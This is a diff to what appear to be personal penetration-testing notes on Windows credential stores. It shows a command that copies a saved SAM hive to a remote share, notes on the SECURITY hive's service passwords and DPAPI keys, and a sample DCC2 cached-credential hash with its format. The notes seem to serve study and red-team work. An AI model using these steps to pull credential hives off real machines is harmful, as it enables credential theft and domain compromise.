@@ -40,5 +40,6 @@ move sam.save \\<hoost ip>\SHARENAME
 			-> Service acc passes, DPAPI local keys (`dpapi_userkey`, `dpapi_machinekey`), and EFS/encryption keys.
 		-> contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
 			-> `$DCC2$10240#Administrator#4c253e4b65c007a8cd683ea57bc43c76`
-			-> 
+			-> syntax:`$DCC2$<rounds>#<username>#<32-char hex digest>` 
+				-> `$DCC2$` - signature, 
 	- `C:\Windows\System32\config\SECURITY `
